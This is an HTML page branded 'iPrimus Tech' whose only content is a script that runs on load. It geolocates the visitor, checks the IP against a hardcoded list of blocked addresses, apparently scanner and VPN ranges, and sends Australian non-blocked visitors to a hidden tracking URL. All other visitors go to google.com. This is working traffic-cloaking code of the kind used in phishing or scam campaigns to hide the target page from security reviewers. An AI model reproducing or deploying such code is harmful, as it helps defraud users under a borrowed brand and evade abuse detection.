<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>iPrimus Tech</title>
  <script>
    const allowedCountry = 'AU';

    const blockedIPs = [
      "185.18.222.147", "103.17.196.155", "198.44.133.53", "138.199.22.183", "106.161.65.206",
      "54.200.5.221", "35.89.14.236", "104.210.79.75", "35.88.70.185", "96.0.0.81",
      "20.28.16.4", "104.28.108.0", "16.50.232.14", "173.239.194.27", "217.64.126.104",
      "104.28.35.3", "104.28.35.4", "68.218.165.136", "173.239.194.229", "68.218.165.140",
      "52.243.103.225", "48.215.3.146", "149.88.101.20", "217.64.126.150", "104.28.125.4",
      "154.16.81.84", "54.156.251.192", "34.235.48.77", "149.154.161.", 
      "212.143.94.254", "212.6.82.", "40.80.158.10", "89.248.171.", "85.208.139.205",
      "138.199.59.", "128.90.177.209", "128.90.63.191", "74.80.181.154", "212.102.63.",
      "82.102.31.156", "31.217.248.", "159.148.128.163", "85.254.40.226", "173.239.203.152"
    ];

    async function checkAccess() {
      try {
        // 1. نجيبو الدولة من API سريع
        const countryRes = await fetch("https://api.country.is");
        const countryData = await countryRes.json();
        const country = countryData.country;

        // 2. نجيبو IP من service آخر
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        const ip = ipData.ip;

        console.log("IP:", ip, "Country:", country);

        // 3. نشوفو واش IP محضور
        const isBlocked = blockedIPs.some(blocked => {
          return blocked.endsWith('.') ? ip.startsWith(blocked) : ip === blocked;
        });

        if (country === allowedCountry && !isBlocked) {
          window.location.href = "https://www.upsearching.com/DZRZX6W/SS8GLPH/";
        } else {
          window.location.href = "https://google.com";
        }

      } catch (err) {
        console.error("Error checking access:", err);
        window.location.href = "https://google.com";
      }
    }

    window.onload = checkAccess;
  </script>
</head>
</html>
